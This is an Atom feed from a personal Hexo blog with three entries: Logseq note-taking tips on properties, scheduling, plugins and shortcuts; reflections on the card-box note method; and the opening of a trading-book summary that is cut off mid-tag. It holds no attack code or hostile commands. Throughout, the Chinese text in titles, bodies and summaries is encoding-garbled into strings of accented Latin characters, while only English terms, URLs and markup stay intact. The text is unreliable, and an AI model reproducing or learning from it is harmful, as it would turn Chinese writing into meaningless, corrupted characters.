<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>å®‰å…¨ä»£ç </title>
  
  
  <link href="http://usmacd.com/atom.xml" rel="self"/>
  
  <link href="http://usmacd.com/"/>
  <updated>2022-10-07T16:00:00.000Z</updated>
  <id>http://usmacd.com/</id>
  
  <author>
    <name>henices</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Logseq ä½¿ç”¨å°ç»“ ï¼ˆä¸‰ï¼‰</title>
    <link href="http://usmacd.com/2022/10/08/logseq3/"/>
    <id>http://usmacd.com/2022/10/08/logseq3/</id>
    <published>2022-10-07T16:00:00.000Z</published>
    <updated>2022-10-07T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>ä½¿ç”¨ Logseq å†™ç¬”è®°å·²ç»å¤§åŠå¹´äº†ï¼ŒLogseq æ˜¯è¿™ä¹ˆå¤šå¹´æ¥é™¤äº† vim ä¹‹å¤–ï¼Œå”¯ä¸€å¯ä»¥åœ¨ä½¿ç”¨ä¸Šèºæ—‹ä¸Šå‡çš„è½¯ä»¶ã€‚æˆ‘æŠŠ Logseq æ¨èç»™åª³å¦‡ï¼Œå¥¹ç”¨æ¥å†™ä¼šè®®çºªè¦ï¼Œå†™å¤‡å¿˜å½•ï¼Œç®¡ç†å¾…åŠäº‹é¡¹ï¼Œä¹Ÿç”¨å¾—æŒºå¥½ã€‚</p><p>Logseq çš„æˆåŠŸä¹‹å¤„åœ¨äºå®ƒé™ä½äº†è®°å½•çš„æˆæœ¬ï¼Œä¸éœ€è¦å¤§æ®µå¤§æ®µçš„æ–‡å­—ï¼Œä¹Ÿä¸éœ€è¦å¤ªå¤šçš„æ–‡ç« ç»“æ„ï¼Œéšæ—¶éƒ½å¯ä»¥è®°å½•ã€‚Logseq æ¯”è¾ƒä¸¥é‡çš„é—®é¢˜æ˜¯ï¼Œå®ƒçš„ä½¿ç”¨å¤ªçµæ´»äº†ï¼Œæ—¶é—´ä¸€æ‹‰é•¿ï¼Œå‰åè®°å½•çš„æ ‡å‡†ã€æ ¼å¼ã€æ ‡ç­¾ç­‰è¦ç´ å¯èƒ½ä¸ä¸€è‡´ï¼Œå®¹æ˜“é€ æˆç¬”è®°å‡Œä¹±ã€‚ç¬”è®°ä¸€å‡Œä¹±å°±æ²¡æ³•æœ‰æ•ˆçš„èšåˆï¼Œç¬”è®°çš„æœ‰æ•ˆèšåˆå½¢æˆä¸€ä¸ªæœ‰æ„ä¹‰çš„æƒ³æ³•ç¾¤æ˜¯ Logseq ç­‰åŒé“¾è½¯ä»¶å’Œå…¶ä»–ç¬”è®°è½¯ä»¶ç›¸æ¯”æœ€æœ‰ä»·å€¼çš„åœ°æ–¹ã€‚</p><p>æˆ‘è¿™åŠå¹´æ¥æ€»ç»“å‡ºç¬”è®°ç³»ç»ŸæˆåŠŸçš„å…³é”®æ˜¯ï¼š åœ¨åŒä¸€ä¸ªåœ°æ–¹ï¼Œç”¨åŒæ ·çš„æ ¼å¼å’Œä¸€è‡´çš„æ ‡å‡†è®°å½•ä½ çš„æ´è§ã€‚ä½†æ˜¯ç”±äº Logseq ç¼ºä¹æœ‰æ•ˆçš„å·¥ä½œæµï¼Œæ²¡æ³•è‡ªåŠ¨åŒ–æç¤ºå¿…è¦çš„æ­¥éª¤ï¼Œåªèƒ½é€šè¿‡ä¸æ–­çš„ç»ƒä¹ æ¥å¼ºåŒ–å­¦ä¹ ã€‚å¦å¤– Logseq ä¸­ page å’Œ tag åªæ˜¯èµ·åˆ°è¿‡æ»¤ç¬”è®°çš„ä½œç”¨ï¼Œæœ€å…³é”®çš„ç¬”è®°ä¹‹é—´çš„é“¾æ¥å´å¾ˆå®¹æ˜“è¢«å¿½è§†ï¼Œtag çš„æ•°é‡ä¸€å¤šåˆä¼šå¼€å§‹ç¬”è®°å‡Œä¹±äº†ã€‚</p><p>æ€»è€Œè¨€ä¹‹ï¼Œå¦‚æœåªæ˜¯æŠŠ Logseq ä½œä¸ºå¤‡å¿˜ï¼Œæˆ–è€…ç®€å•ä½œä¸ºä¿¡æ¯è®°å½•ï¼ŒæŒºå¥½ç”¨ä¹Ÿä¸éœ€è¦å­¦ä¹ å¤ªå¤šçš„ä¸œè¥¿ï¼Œä½†æ˜¯å¦‚æœéœ€è¦ä½¿ç”¨ Logseq æ¥å®è·µå¡ç‰‡ç¬”è®°æ³•ç­‰ PKM ç†è®ºï¼Œææ€•è¿˜æ˜¯éœ€è¦èŠ±è´¹ä¸€äº›åŠŸå¤«ä»”ç»†ç¢ç£¨ä¸€ç•ªã€‚PKM æ–¹é¢çš„ä¹¦ç±æˆ‘å¼ºåŠ›æ¨è ã€Šå¡ç‰‡ç¬”è®°å†™ä½œæ³•ã€‹ä¸€ä¹¦ï¼Œä¸­æ–‡ç¿»è¯‘å¾ˆä¸é”™ï¼Œè™½ç„¶ä¹¦åæ˜¯è°ˆå†™ä½œï¼Œé‡Œé¢çš„å†…å®¹å´æ¶‰åŠå¾ˆå¹¿ï¼Œæˆ‘è‡ªå·±é˜…è¯»åæ”¶ç›Šè‰¯å¤šã€‚</p><p>ä¸Šé¢è¯´çš„æ˜¯ä¸€äº›ã€Œé“ã€å±‚é¢çš„ä¸œè¥¿ï¼Œ Logseq åœ¨ã€Œæœ¯ã€æ–¹é¢çš„ä¸œè¥¿ä¹Ÿä¸å°‘ï¼Œä¸‹é¢å°†ä»‹ç»ä¸€äº›å‰ä¸¤ç¯‡å°šæœªæ¶‰åŠçš„åŠŸèƒ½å’Œä½¿ç”¨æŠ€å·§ã€‚</p><h2 id="â˜†-ä½¿ç”¨-properties"><a href="#â˜†-ä½¿ç”¨-properties" class="headerlink" title="â˜† ä½¿ç”¨ properties"></a>â˜† ä½¿ç”¨ properties</h2><p><a href="https://docs.logseq.com/#/page/term%2Fproperties">https://docs.logseq.com/#/page/term%2Fproperties</a></p><p>åœ¨ Logseq ä¸­æœ‰ä¸¤ç§ propertiesï¼Œ page properties å’Œ block propertiesã€‚</p><ul><li>Page properties åœ¨ç¬¬ä¸€ä¸ª block å†™ <code>property:: value</code>  </li><li>Block properties åœ¨æ¯ä¸ª block å†…ä½¿ç”¨ <code>property:: value</code></li></ul><p>åœ¨ä½¿ç”¨ block properties æ—¶ï¼Œéœ€è¦è¾“å…¥ <code>shift + Enter</code> æ¥è¿›è¡Œæ¢è¡Œï¼Œæ¢è¡Œåè¾“å…¥ <code>::</code> Logseq ä¼šè‡ªåŠ¨æç¤ºå·²ç»ä½¿ç”¨è¿‡çš„ propertyã€‚ç†è§£ properties å¯ä»¥ç®€å•çš„æŠŠ block çœ‹æˆæ•°æ®åº“çš„ä¸€æ¡è®°å½•ï¼Œ properties å°±æ˜¯ä¸åŒçš„å­—æ®µï¼Œå¯ä»¥é€šè¿‡ Logseq çš„ query æ¥æŸ¥è¯¢ç›¸å…³è®°å½•ã€‚åœ¨ä½¿ç”¨ properties æ—¶å¯ä»¥å¼•ç”¨ page æˆ–è€… tagï¼Œå¯ä»¥é€šè¿‡è¿™ç§æ–¹æ³•æ¥ç´¢å¼•è¿™æ¡è®°å½•ã€‚</p><p>ä¾‹å¦‚ï¼Œæˆ‘å°†ä¹¦ç±çš„ block éƒ½æ·»åŠ äº† <code>category:: Books</code> çš„å±æ€§ï¼Œåç»­å¯ä»¥ä½¿ç”¨ <code>&#123;&#123;query (property category Books) &#125;&#125;</code> æ¥æŸ¥è¯¢æ‰€æœ‰ä¹¦ç±äº†ï¼Œæ„Ÿè§‰ä¸Šæœ‰ç‚¹ç±»ä¼¼ notion çš„è¡¨æ ¼ã€‚</p><p><img src="https://github.com/henices/pictures/raw/master/logseq3_1.png"></p><h2 id="â˜†-ä½¿ç”¨-x2F-Scheduled-åˆ¶å®šè®¡åˆ’"><a href="#â˜†-ä½¿ç”¨-x2F-Scheduled-åˆ¶å®šè®¡åˆ’" class="headerlink" title="â˜† ä½¿ç”¨ &#x2F;Scheduled åˆ¶å®šè®¡åˆ’"></a>â˜† ä½¿ç”¨ &#x2F;Scheduled åˆ¶å®šè®¡åˆ’</h2><p>ä½¿ç”¨ Schedule çš„åŠŸèƒ½çš„æ–¹æ³•æ¯”è¾ƒç®€å•ï¼Œåœ¨å†™å®Œä¸€æ¡ block åï¼Œè¾“å…¥ <code>shift + enter </code> æ¢è¡Œåï¼Œè¾“å…¥ <code>/Schedule</code> åœ¨å¼¹å‡ºçš„ç•Œé¢ä¸­é€‰æ‹©æ—¶é—´å‘¨æœŸå³å¯ã€‚</p><p><img src="https://github.com/henices/pictures/raw/master/logseq3_2.png"></p><p>åœ¨ Schedule è§„å®šçš„æ—¶é—´å†…ï¼ŒLogseq çš„ Journals é¡µé¢å¯ä»¥çœ‹åˆ°ç›¸å…³çš„å†…å®¹ã€‚</p><h2 id="â˜†-ä¸€äº›å¥½ç”¨çš„æ’ä»¶"><a href="#â˜†-ä¸€äº›å¥½ç”¨çš„æ’ä»¶" class="headerlink" title="â˜† ä¸€äº›å¥½ç”¨çš„æ’ä»¶"></a>â˜† ä¸€äº›å¥½ç”¨çš„æ’ä»¶</h2><p>æ’ä»¶å¯ä»¥æ‹“å±• Logseq çš„åŠŸèƒ½ï¼Œä½¿ç”¨æ’ä»¶çš„æ–¹æ³•åœ¨ <a href="https://www.usmacd.com/2022/03/07/logseq2/">Logseq ä½¿ç”¨å°ç»“ ï¼ˆäºŒï¼‰</a> ä¸­æœ‰è¯¦ç»†ä»‹ç»ï¼Œè¿™é‡Œå°±ä¸å†ç»†è¯´ã€‚</p><h3 id="Logseq-Plugin-Tabs"><a href="#Logseq-Plugin-Tabs" class="headerlink" title="Logseq Plugin Tabs"></a>Logseq Plugin Tabs</h3><p><a href="https://github.com/pengx17/logseq-plugin-tabs">https://github.com/pengx17/logseq-plugin-tabs</a></p><p>Plugin Tabs åƒæ‰“å¼€æµè§ˆå™¨ä¸€æ ·æ‰“å¼€ pages æˆ–è€… blocksï¼Œå¯¹äºå†…å®¹æ¯”è¾ƒå¤šçš„ pageï¼Œè¿™ä¸ªæ’ä»¶éå¸¸å®ç”¨ã€‚</p><p><img src="https://github.com/henices/pictures/raw/master/logseq3_4.png"></p><h3 id="logseq-plugin-mark-map"><a href="#logseq-plugin-mark-map" class="headerlink" title="logseq-plugin-mark-map"></a>logseq-plugin-mark-map</h3><p><a href="https://github.com/vipzhicheng/logseq-plugin-mark-map">https://github.com/vipzhicheng/logseq-plugin-mark-map</a></p><p>Mark map å¯ä»¥è‡ªåŠ¨åŒ–åœ°æŠŠä½ çš„ç¬”è®°ç”¨å¯¼å›¾çš„å½¢å¼è¾“å‡ºï¼Œæ–¹é¢å±•ç¤ºå’Œè®°å¿†ã€‚</p><p><img src="https://github.com/henices/pictures/raw/master/logseq3_5.png"></p><h2 id="â˜†-ä¸€äº›ä½¿ç”¨ä¸Šçš„å°æŠ€å·§"><a href="#â˜†-ä¸€äº›ä½¿ç”¨ä¸Šçš„å°æŠ€å·§" class="headerlink" title="â˜† ä¸€äº›ä½¿ç”¨ä¸Šçš„å°æŠ€å·§"></a>â˜† ä¸€äº›ä½¿ç”¨ä¸Šçš„å°æŠ€å·§</h2><ul><li>Logseq content wide mode  å¯ä»¥ä½¿ç”¨å¿«æ·é”®åˆ‡æ¢ <code>t w</code>  </li><li>Logseq çš„ property å¯ä»¥é€šè¿‡è¾“å…¥ <code>::</code> æ¥è§¦å‘è‡ªåŠ¨è¡¥å…¨æ“ä½œï¼Œéå¸¸æ–¹ä¾¿ã€‚  </li><li>Logseq ä½¿ç”¨å¿«æ·é”® <code>Cmd + Shift + i</code> å¯ä»¥æ‰“å¼€ devtools  </li><li>Logseq v0.68ï¼Œè‡ªåŠ¨è¡¥å…¨æä¾›ä¸¤ä¸ªå¿«æ·é”® <code>mod+p</code> å’Œ <code>mod+n</code> æ¯”è¾ƒæ–¹ä¾¿äº†  </li><li>Logseq å¯ä»¥ä½¿ç”¨ <code>command + </code> å’Œ <code>command -</code> æ¥æ”¾å¤§æˆ–è€…ç¼©å° Logseq çš„å­—ä½“å¤§å°  </li><li>Logseq 0.7.1 æ–°åŠŸèƒ½ï¼šCopy &amp; Paste with rich-text formatsï¼Œå¦‚æœç²˜è´´æ—¶ä¸æƒ³ä¿ç•™æ ¼å¼ <code>mod + shift + v</code>  </li><li>Logseq ç§»åŠ¨å…‰æ ‡çš„å¿«æ·é”®ï¼š<code>mod + p</code> å‘ä¸Šç§»åŠ¨å…‰æ ‡ï¼Œ<code>mod + n</code> å‘ä¸‹ç§»åŠ¨å…‰æ ‡  </li><li>Logseq Markdown è¯­æ³•æ”¯æŒ <code> Horizontal Rules</code>ï¼Œå¯ä»¥ä½¿ç”¨ <code>---</code>åˆ†éš”å¡ç‰‡ç¬”è®°ã€‚</li></ul><p>mod åœ¨ windows å’Œ linux ç³»ç»Ÿä¸­æ˜¯ <code>ctrl</code>ï¼Œ åœ¨ macOS ç³»ç»Ÿä¸­æ˜¯ <code>command</code></p><h2 id="â˜†-å‚è€ƒé“¾æ¥"><a href="#â˜†-å‚è€ƒé“¾æ¥" class="headerlink" title="â˜†  å‚è€ƒé“¾æ¥"></a>â˜†  å‚è€ƒé“¾æ¥</h2><p><a href="https://www.usmacd.com/2022/02/21/logseq/">https://www.usmacd.com/2022/02/21/logseq/</a><br><a href="https://www.usmacd.com/2022/03/07/logseq2/">https://www.usmacd.com/2022/03/07/logseq2/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä½¿ç”¨ Logseq å†™ç¬”è®°å·²ç»å¤§åŠå¹´äº†ï¼ŒLogseq æ˜¯è¿™ä¹ˆå¤šå¹´æ¥é™¤äº† vim ä¹‹å¤–ï¼Œå”¯ä¸€å¯ä»¥åœ¨ä½¿ç”¨ä¸Šèºæ—‹ä¸Šå‡çš„è½¯ä»¶ã€‚æˆ‘æŠŠ Logseq æ¨èç»™åª³å¦‡ï¼Œå¥¹ç”¨æ¥å†™ä¼šè®®çºªè¦ï¼Œå†™å¤‡å¿˜å½•ï¼Œç®¡ç†å¾…åŠäº‹é¡¹ï¼Œä¹Ÿç”¨å¾—æŒºå¥½ã€‚&lt;/p&gt;
&lt;p&gt;Logseq çš„æˆåŠŸä¹‹å¤„åœ¨äºå®ƒé™ä½äº†è®°å½•çš„æˆæœ¬ï¼Œä¸éœ€è¦</summary>
      
    
    
    
    
    <category term="Software" scheme="http://usmacd.com/tags/Software/"/>
    
  </entry>
  
  <entry>
    <title>å…³äºç¬”è®°çš„ä¸€äº›æ€è€ƒ</title>
    <link href="http://usmacd.com/2022/09/16/note/"/>
    <id>http://usmacd.com/2022/09/16/note/</id>
    <published>2022-09-15T16:00:00.000Z</published>
    <updated>2022-09-22T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>Random Notes (æ¼«æ¸¸ç¬”è®°) çš„æŠ€æœ¯åŸç†æ˜¯ç”¨æ–°è§†è§’å»å®¡è§†æ—§æƒ³æ³•ï¼Œå’Œè‡ªå·±ä»¥å‰çš„æƒ³æ³•ä¸æœŸè€Œé‡çš„æ„Ÿè§‰éå¸¸å¥‡å¦™ã€‚æ€»ä½“æ¥è¯´äººæ˜¯ä¼šä¸æ–­è¿›æ­¥çš„ï¼Œç»è¿‡ä¸€æ®µæ—¶é—´åå†å»é‡æ¸©è‡ªå·±æŸä¸ªæ—¶åˆ»çš„æƒ³æ³•ï¼Œå¯èƒ½ä»¥å‰çš„ä¸€äº›ç–‘æƒ‘ç°åœ¨å·²ç»æ²¡æœ‰äº†ï¼Œä¹Ÿå¯èƒ½å¯¹æŸä¸ªé—®é¢˜æœ‰äº†æ›´è¿›ä¸€æ­¥çš„æ€è·¯ï¼Œè¿™æ˜¯ä¿ƒä½¿æƒ³æ³•è¿­ä»£çš„ä¸€ç§æ–¹æ³•ã€‚</p></li><li><p>æƒ³è¦åšåˆ°æƒ³æ³•çš„è‡ªç„¶è¿­ä»£ï¼Œå¿…è¦çš„æ¡ä»¶æ˜¯å¯ä»¥é©¬ä¸Šå›åˆ°è¿‡å»çš„æŸä¸ªæ—¶åˆ»ï¼Œè€Œä¸”é‚£ä¸ªæ—¶åˆ»çš„ä¸Šä¸‹æ–‡æ²¡æœ‰ä¸¢å¤±ï¼Œå¦‚æœä¸Šä¸‹æ–‡ä¸¢å¤±æ„å‘³ç€å·²ç»çœ‹ä¸æ‡‚ä»¥å‰çš„ç¬”è®°äº†ï¼Œè‡ªç„¶ä¹Ÿå°±æ²¡æœ‰äº†è¿­ä»£çš„å¯èƒ½æ€§ã€‚</p></li><li><p>å¡ç‰‡ç›’ç¬”è®°æ³•è¦æ±‚ç”¨å®Œæ•´çš„å¥å­ç²¾è¦ç®€è¿°æƒ³æ³•ï¼Œç¬”è®°ä¹‹é—´çš„è¿æ¥åˆ™è¡¥å……äº†ä¸Šä¸‹æ–‡ï¼Œä¸ºæƒ³æ³•è¿­ä»£åˆ›é€ äº†æœ‰åˆ©æ¡ä»¶ã€‚</p></li><li><p>å†™æ°¸ä¹…ç¬”è®°æ—¶ï¼Œåº”è¯¥å‡è®¾è¯»è€…å¯¹æ–‡æœ¬èƒŒåçš„æ€æƒ³ï¼ŒåŸæ–‡èƒŒæ™¯ä¸€æ— æ‰€çŸ¥ï¼Œåªå…·å¤‡ç›¸å…³çš„é¢†åŸŸçŸ¥è¯†ã€‚è¿™é‡Œçš„è¯»è€…å…¶å®ä¹ŸåŒ…æ‹¬æœªæ¥çš„è‡ªå·±ï¼Œæˆ‘ä»¬å†™ä¸‹æ°¸ä¹…ç¬”è®°åï¼Œå¾ˆå¿«å°±ä¼šå°†å…¶çš„ä¸Šä¸‹æ–‡é—å¿˜ï¼Œå°±æƒ³ä»æ²¡æœ‰è§è¿‡è¯¥ç¬”è®°çš„å…¶ä»–è¯»è€…ä¸€æ ·ã€‚</p></li><li><p>æˆ‘ä»¬åº”è¯¥å¯»æ‰¾ä¸æˆ‘ä»¬è§‚ç‚¹ç›¸åçš„è®ºç‚¹æˆ–è€…äº‹å®æ¥æŒ‘æˆ˜æˆ‘ä»¬çš„æ—¢æœ‰æ€ç»´ï¼Œä½†æ˜¯å—ã€Œç¡®è®¤åå·®ã€çš„å½±å“ï¼Œæˆ‘ä»¬ä¼šä¸ç»æ„çš„å¿½ç•¥è¿™äº›ä¿¡æ¯ï¼Œé‚£äº›å’Œæˆ‘ä»¬è§‚ç‚¹ä¸€è‡´çš„ä¿¡æ¯æœ‰å¾ˆå¤§å¸å¼•åŠ›ï¼Œå› ä¸ºè¿™äº›ä¿¡æ¯å¯ä»¥è¯æ˜è‡ªå·±å¾ˆåšå­¦ã€‚è§£å†³ ã€Œç¡®è®¤åå·®ã€çš„æ–¹æ³•ï¼šæŠŠå¯»æ‰¾è¯å®æ€§ä¿¡æ¯å˜ä¸ºæ”¶é›†æ‰€æœ‰ä¿¡æ¯ï¼Œä¸éœ€è¦å…³æ³¨è¿™äº›ä¿¡æ¯æ”¯æŒçš„å…·ä½“è§‚ç‚¹ã€‚</p></li><li><p>æˆ‘ä»¬ä½¿ç”¨å¡ç‰‡ç›’ç¬”è®°æ³•ï¼Œå¯¹ä¹ æƒ¯æœ€é‡è¦çš„è½¬å˜æ˜¯å°†æ³¨æ„åŠ›ä»ä¸ªåˆ«é¡¹ç›®çš„é¢„è®¾ç«‹åœºå˜æˆæ€è€ƒç¬”è®°ä¹‹é—´çš„å¼€æ”¾æ€§è”ç³»ã€‚é€šè¿‡ä¸€æ®µæ—¶é—´çš„è®­ç»ƒï¼Œåœ¨é˜…è¯»è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥è½»æ¾æ‰¾å‡ºä¸é¢„è®¾è§‚ç‚¹ç›¸æ‚–çš„ä¿¡æ¯ã€‚å½“è¿™äº›ä¿¡æ¯æ”¹å˜æˆ‘ä»¬å¯¹æŸäº›é—®é¢˜çš„çœ‹æ³•æ—¶ï¼Œæˆ‘ä»¬ä¼šæ„Ÿåˆ°ç›¸å½“å…´å¥‹ï¼Œä»è€Œæ…¢æ…¢å–œæ¬¢ä¸Šè¿™ç§æ„Ÿè§‰ã€‚</p></li><li><p>åœ¨å®è·µå¡ç‰‡ç¬”è®°æ³•çš„è¿‡ç¨‹ä¸­ï¼Œä¼šé‡ä¸Šä¸€æ•´å¤©éƒ½æ²¡å†™ä¸€å¼ å¡ç‰‡çš„æ—¶å€™ï¼Œè€Œæœ‰çš„æ—¶å€™åˆ™ä¸€å¤©å†™åå¤šå¼ å¡ç‰‡ã€‚é™åˆ¶æ¯å¤©å†™ç¬”è®°çš„æ•°é‡å¯ä»¥è®©å†™å¡ç‰‡ç›’ç¬”è®°çš„è¿‡ç¨‹æ›´åŠ è½»æ¾ï¼Œé¿å…äº†è¿‡äºæ”¾æ¾çš„çŠ¶æ€ï¼Œä¹Ÿé¿å…äº†è¿‡äºç´§ç»·çš„çŠ¶æ€ï¼Œæœ‰åˆ©äºæˆ‘ä»¬ä¿æŒè‰¯å¥½çš„çŠ¶æ€ã€‚å¦ä¸€ä¸ªå¥½å¤„åˆ™æ˜¯è®©ä½ é€‰æ‹©ç¬”è®°å†…å®¹æ—¶æ›´åŠ æŒ‘å‰”ï¼Œæœ‰åˆ©äºæé«˜ç¬”è®°çš„è´¨é‡ã€‚</p></li><li><p>ä½ å¯ä»¥å°†ç›®æ ‡è®¾ç½®ä¸ºæ¯å¤©å†™3æ¡ç¬”è®°ï¼Œæˆ–è€…æ¯å¹´å‡ºä¸€æœ¬ä¹¦ï¼Œä»ç„¶å¯ä»¥åœ¨åˆç†çš„æ—¶é—´å†…ç§¯ç´¯å¤§é‡çš„æƒ³æ³•ã€‚</p></li><li><p>å…³äºç¬”è®°ç®¡ç†å­˜åœ¨å‡ ä¸ªè¯¯åŒºï¼Œ1. ç¬”è®°è½¯ä»¶&#x2F;åšå®¢ç³»ç»Ÿï¼Œæˆ‘å…ˆåä½¿ç”¨è¿‡ EverNoteï¼ŒWizNoteï¼ŒVNoteï¼ŒCSDN blogï¼ŒGoogle blogspot, WordPress 2. ç¬”è®°æ ¼å¼ï¼Œæˆ‘å…ˆåä½¿ç”¨è¿‡ txt, orgmode, markdown å…¶å®è¿™äº›éƒ½ä¸æ˜¯å…³é”®ï¼Œé™¤äº†æŠ˜è…¾è¿˜æ˜¯æŠ˜è…¾ã€‚ä»¥å‰æˆ‘å¸¸è¯´ä¸€ä¸ªæ®µå­ï¼Œä½ ä»¥ä¸ºä½ åœ¨å†™åšå®¢ï¼Œå…¶å®ä½ åœ¨æŠ˜è…¾ Wordpress æ’ä»¶ã€‚</p></li><li><p>æˆ‘ä»¥å‰æ€è€ƒè¿™ä¸ªé—®é¢˜è®¤ä¸ºæ˜¯ç¬”è®°ç¼ºä¹ç»„ç»‡ç»“æ„ï¼Œå®è·µç»“æœè¡¨æ˜è‰¯å¥½çš„åˆ†ç±»ç¡®å®æœ‰ä¸€å®šå¸®åŠ©ï¼Œä½†æ˜¯ä¸æ˜¯æœ€é‡è¦çš„ã€‚æœ€é‡è¦çš„æ˜¯åœ¨åŒä¸€ä¸ªåœ°æ–¹ï¼Œç”¨åŒæ ·çš„æ ¼å¼å’Œä¸€è‡´çš„æ ‡å‡†è®°å½•ä½ çš„æ´è§ã€‚</p></li><li><p>å„ç§ç¬”è®°è½¯ä»¶ï¼Œåšå®¢ç³»ç»Ÿï¼Œç¬”è®°æ ¼å¼çš„åˆ‡æ¢éƒ½ä¼šå¸¦æ¥ä¿¡æ¯ä¸¢å¤±ã€‚ä¿¡æ¯ä¸¢å¤±å®¹æ˜“é€ æˆå¿ƒç†è´Ÿæ‹…ï¼Œæˆ‘ä» 2005 å¹´å¼€å§‹å†™æ–‡ç« åˆ°ç°åœ¨å·²ç»ä¸¢å¤±äº† 50%ä»¥ä¸Šï¼Œè¿™äº›æ–‡ç« æ•£è½åœ¨äº’è”ç½‘çš„å„ä¸ªè§’è½ï¼Œéå¸¸ä»¤äººç—›å¿ƒã€‚</p></li><li><p>å¡ç‰‡ç¬”è®°æ³•å±äºè‡ªä¸‹è€Œä¸Šçš„å‘æ•£æ€ç»´ï¼Œå‘æ•£æ€ç»´æœ‰ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æ— æ³•æŠŠæ¡å‘æ•£çš„åº¦ã€‚ä¸ºäº†åº”å¯¹è¿™ä¸ªé—®é¢˜ï¼Œå¢æ›¼æå‡ºçš„åŠæ³•æ˜¯ä»”ç»†æ€è€ƒç¬”è®°ä¹‹é—´çš„è”ç³»ï¼Œå†™ç¬”è®°æ—¶å‚è€ƒæ–‡çŒ®ç¬”è®°å’Œè‡ªå·±ä»¥å‰å†™çš„ç¬”è®°ï¼Œå®šæœŸè‡ªä¸Šè€Œä¸‹åˆ¶ä½œç´¢å¼•å¡ç‰‡ï¼Œè¿™äº›åšæ³•çš„ç›®çš„æ˜¯é¿å…æƒ³æ³•è¿‡äºå¤ªå‘æ•£ã€‚</p></li><li><p>æ€ç»´éœ€è¦å‘æ•£ï¼Œä½†æ˜¯é¢†åŸŸéœ€è¦èšç„¦ï¼Œæˆ‘ä»¬åœ¨è‡ªå·±çš„ä¸“ä¸šï¼Œè´¢åŠ¡ç­‰é¢†åŸŸæ˜¯éœ€è¦ä¸æ–­ç²¾è¿›çš„ï¼Œè¿™ä¸¤ä¸ªæ–¹é¢ä¼¼ä¹æ˜¯çŸ›ç›¾çš„ã€‚æœ‰äººå»ºè®®ä½¿ç”¨åˆ†ç±»æ³•ï¼ŒæŠŠå…³æ³¨çš„é¢†åŸŸåˆ†ç±»ï¼Œåœ¨æ—¥å¸¸å·¥ä½œå­¦ä¹ ä¸­ä¸æ–­å®Œå–„ï¼Œä½†è¿™ç§æ–¹æ³•å¾ˆå®¹æ˜“å›åˆ°èµ„æ–™å½’æ¡£çš„è€è·¯ã€‚</p></li><li><p>æœ€è¿‘çš„ç ”ç©¶å‘ç°å¯ä»¥ä½¿ç”¨ P.A.R.A. æ¥ç»„ç»‡é¡¶å±‚ç»“æ„ï¼Œç»Ÿé¢†éœ€è¦ç²¾è¿›çš„é¢†åŸŸï¼Œåœ¨å…·ä½“æƒ³æ³•çš„è®°å½•ä¸Šåˆ™ç»§ç»­ä½¿ç”¨å¡ç‰‡ç¬”è®°æ³•ã€‚è¿™ç§æ–¹æ³•ä½¿ç”¨ P.A.R.A. ä¸æ–­æ¨åŠ¨è‡ªå·±åœ¨å…³æ³¨é¢†åŸŸçš„å–å¾—è¿›å±•ï¼Œåˆèƒ½åœ¨å…³é”®çš„æ€è€ƒä¸Šä½¿ç”¨å¡ç‰‡ç¬”è®°æ³•ï¼Œè‡ªç”¨ä¸€æ®µæ—¶é—´æ„Ÿè§‰ä¸é”™ã€‚</p></li></ul><p>æœªå®Œï¼Œå¾…ç»­ â€¦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Random Notes (æ¼«æ¸¸ç¬”è®°) çš„æŠ€æœ¯åŸç†æ˜¯ç”¨æ–°è§†è§’å»å®¡è§†æ—§æƒ³æ³•ï¼Œå’Œè‡ªå·±ä»¥å‰çš„æƒ³æ³•ä¸æœŸè€Œé‡çš„æ„Ÿè§‰éå¸¸å¥‡å¦™ã€‚æ€»ä½“æ¥è¯´äººæ˜¯ä¼šä¸æ–­è¿›æ­¥çš„ï¼Œç»è¿‡ä¸€æ®µæ—¶é—´åå†å»é‡æ¸©è‡ªå·±æŸä¸ªæ—¶åˆ»çš„æƒ³æ³•ï¼Œå¯èƒ½ä»¥å‰çš„ä¸€äº›ç–‘æƒ‘ç°åœ¨å·²ç»æ²¡æœ‰äº†ï¼Œä¹Ÿå¯èƒ½å¯¹æŸä¸ªé—®é¢˜æœ‰äº†æ›´è¿›ä¸€æ­¥çš„æ€è·¯ï¼Œè¿™æ˜¯</summary>
      
    
    
    
    
    <category term="PKM" scheme="http://usmacd.com/tags/PKM/"/>
    
  </entry>
  
  <entry>
    <title>ä¸“ä¸šæŠ•æœºåŸç†ä¸­çš„æŠ€æœ¯åˆ†ææ³•åˆ™æ‘˜è¦</title>
    <link href="http://usmacd.com/2022/09/08/trader_vic/"/>
    <id>http://usmacd.com/2022/09/08/trader_vic/</id>
    <published>2022-09-07T16:00:00.000Z</published>
    <updated>2022-09-07T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>æœ‰å…³é‡‘èå¸‚åœºæ–¹é¢çš„ä¹¦æˆ‘ä¸ªäººçš„å›¾ä¹¦é¦†é‡Œè‡³å°‘æœ‰1200æœ¬ã€‚å®ƒä»¬ä¸»è¦æ˜¯è®¨è®ºè¯åˆ¸åˆ†æã€æœŸæƒç­–ç•¥ã€æœŸè´§ç­–ç•¥ã€æŠ€æœ¯åˆ†æä»¥åŠå…¶ä»–ç›¸å…³æ–¹é¢çš„ä¹¦ã€‚è¿™äº›ä¹¦å¤§å¤šéƒ½åŒ…å«ç›¸å½“ä¸é”™çš„æ„æƒ³ï¼Œå…¶ä¸­çº¦2%æ˜¯çœŸæ­£ä¼˜ç§€çš„ä½œå“ã€‚ç„¶è€Œï¼Œå®ƒä»¬å¤§å¤šå­˜åœ¨ä¸€ä¸ªå…±åŒçš„é—®é¢˜ï¼šè¯•å›¾æ¨é”€ä¸€ç§â€œæˆ˜èƒœå¸‚åœºâ€çš„æ–¹æ³•ï¼Œå¾ˆå¤šæ–¹æ³•ç”šè‡³æ²¡æœ‰ç»è¿‡å®é™…å¸‚åœºçš„å®Œæ•´æµ‹è¯•ã€‚</p><h2 id="å¦‚ä½•æ­£ç¡®çš„ç»˜åˆ¶è¶‹åŠ¿çº¿"><a 